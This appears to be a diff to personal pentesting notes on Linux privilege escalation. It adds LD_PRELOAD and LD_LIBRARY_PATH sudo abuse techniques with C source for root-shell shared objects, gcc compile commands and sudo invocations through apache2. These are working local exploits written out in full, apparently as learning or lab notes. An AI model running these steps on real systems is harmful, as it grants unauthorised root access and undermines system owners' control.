@@ -204,10 +204,67 @@ Invalid command 'root:....<hash>....'
 - LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. 
 - When set, the shared object will be loaded before any others. 
 - By creating a custom shared object and creating an `init()` function, we can execute code as soon as the object is loaded.
-###### Limitations
+
+ **Limitations**
 
 - LD_PRELOAD will not work if the real user ID is different from the effective user ID. 
 - `sudo` must be configured to preserve the LD_PRELOAD environment variable using the `env_keep` option
+example. 
+- List the programs your user is allowed to run via `sudo -l`:
+- Note that the `env_keep` option includes the LD_PRELOAD environment variable.
+- Create a file (preload.c) with the following contents:
+```
+#include <stdio.h> 
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setresuid(0,0,0); 
+	system("/bin/bash -p"); 
+}
+```
+Compile preload.c to preload.so
+```
+$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+```
+Run any allowed program( apache2 is used in this eg.) using `sudo`, while setting the LD_PRELOAD environment variable to the full path of the preload.so file:
+```
+$ sudo LD_PRELOAD=/tmp/preload.so apache2 
+```
+###### LD_LIBRARY_PATH
+
+This env variable should be preserved in env_keep for further spells to work. 
+- The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.
+- The `ldd` command can be used to print the shared libraries used by a program
+```
+$ ldd /usr/sbin/apache2
+```
+By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead
+
+- Hijacking shared objects using this method is hit or miss. example. Choose one from the list and try it (libcrypt.so.1 seems to work well)
+
+Create a file (library_path.c) with the following contents:
+```
+#include <stdio.h>
+#include <stdlib.h>
+static void hijack() __attribute__((constructor));
+void hijack() { 
+	unsetenv("LD_LIBRARY_PATH");
+	 setresuid(0,0,0); 
+	 system("/bin/bash -p"); 
+}
+```
+Compile library_path.c into libcrypt.so.1: 
+```
+$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
+```
+Run apache2 using `sudo`, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c)
+```
+$ sudo LD_LIBRARY_PATH=. apache2
+```
+#### Cron Jobs
+
+
 
 
 
